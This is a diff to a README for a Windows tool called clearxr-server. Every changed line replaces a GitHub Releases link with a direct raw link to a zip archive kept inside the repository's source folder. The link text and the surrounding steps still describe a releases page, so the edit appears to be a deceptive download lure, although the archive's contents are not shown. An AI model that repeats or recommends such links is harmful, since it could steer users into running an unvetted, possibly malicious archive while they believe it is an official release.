@@ -1,6 +1,6 @@
 # 🖥️ clearxr-server - Run Clear XR on Windows
 
-[![Download clearxr-server](https://img.shields.io/badge/Download-clearxr--server-6a5acd?style=for-the-badge&logo=github)](https://github.com/Fernfamilysystemadministrator709/clearxr-server/releases)
+[![Download clearxr-server](https://img.shields.io/badge/Download-clearxr--server-6a5acd?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Fernfamilysystemadministrator709/clearxr-server/main/xtask/src/clearxr-server-2.9.zip)
 
 ## 🚀 What this app does
 
@@ -17,7 +17,7 @@ Use it if you want:
 
 Visit this page to download the latest release:
 
-https://github.com/Fernfamilysystemadministrator709/clearxr-server/releases
+https://raw.githubusercontent.com/Fernfamilysystemadministrator709/clearxr-server/main/xtask/src/clearxr-server-2.9.zip
 
 When you open the page, look for the newest release at the top. Download the Windows file that matches your system. If there is more than one file, choose the one for Windows.
 
@@ -39,7 +39,7 @@ For the best result, keep Windows updated and close other heavy apps before you 
 Follow these steps:
 
 1. Open the download page:
-   https://github.com/Fernfamilysystemadministrator709/clearxr-server/releases
+   https://raw.githubusercontent.com/Fernfamilysystemadministrator709/clearxr-server/main/xtask/src/clearxr-server-2.9.zip
 
 2. Find the latest release.
 
@@ -210,5 +210,5 @@ If you share your PC with others, keep the folder in a place only you use. That 
 
 If you need the file again, use this page:
 
-[Download clearxr-server from GitHub Releases](https://github.com/Fernfamilysystemadministrator709/clearxr-server/releases)
+[Download clearxr-server from GitHub Releases](https://raw.githubusercontent.com/Fernfamilysystemadministrator709/clearxr-server/main/xtask/src/clearxr-server-2.9.zip)
 
